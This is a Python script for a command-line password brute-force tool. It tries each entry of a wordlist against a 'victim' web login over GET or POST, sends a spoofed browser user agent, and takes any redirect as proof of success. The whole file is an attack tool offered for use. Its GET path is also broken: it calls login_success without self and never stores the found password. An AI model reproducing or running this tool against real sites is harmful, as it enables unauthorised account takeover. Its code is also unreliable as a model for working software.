import re
import json
import requests
import argparse

GET_METHOD = 'get'
POST_METHOD = 'post'

class PasswordBruteforce(object):
    def __init__(self, method, pwd_file_path, victim_url, post_data=None):
        self.method = method
        self.victim_url = victim_url
        self.result = None
        self.post_data = post_data
        self.default_ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
        with open(pwd_file_path, 'r') as pwd_file:
            self.passwords = [x.strip() for x in pwd_file.readlines()]

    def login_success(self, resp):
        if resp.history != []:
            return True
        return False
                           
    def get_bruteforce(self):
        for password in self.passwords:
            resp = requests.get(self.victim_url.replace('{}', password), headers=self.default_ua)
            if login_success(resp):
                break

    def post_bruteforce(self):
        for password in self.passwords:
            resp = requests.post(self.victim_url,
                                 data=json.loads(self.post_data.replace('{}', password)),
                                 headers=self.default_ua)
            if self.login_success(resp):
                self.result = password
                break

    def return_result(self):
        if self.result is not None:
            print ("[+] Login Successfull! Password is: {}".format(self.result))
        else:
            print ("[-] No password match the given username...")
            
    def start(self):             
        if self.method == GET_METHOD:
            self.get_bruteforce()
        else:
            self.post_bruteforce()
            
        self.return_result()
        
def get_args():
    parser = argparse.ArgumentParser(description="Password Brute Force Tool")
                                     

    parser.add_argument('-v','--victim-url', help='Url to attack', required=True)
    parser.add_argument('-p','--password-file', help='Password file path', required=True)
    parser.add_argument('-d','--post-data', help='Post data as JSON', required=False, const=None)
    parser.add_argument('-m','--http-method',
                        help='Use get / post',
                        choices=[GET_METHOD, POST_METHOD],
                        required=True)

    return vars(parser.parse_args())

def main():
    args = get_args()
    pwd_bt = PasswordBruteforce(args['http_method'],
                                args['password_file'],
                                args['victim_url'],
                                args['post_data'])
    pwd_bt.start()

if __name__ == "__main__":
    main()
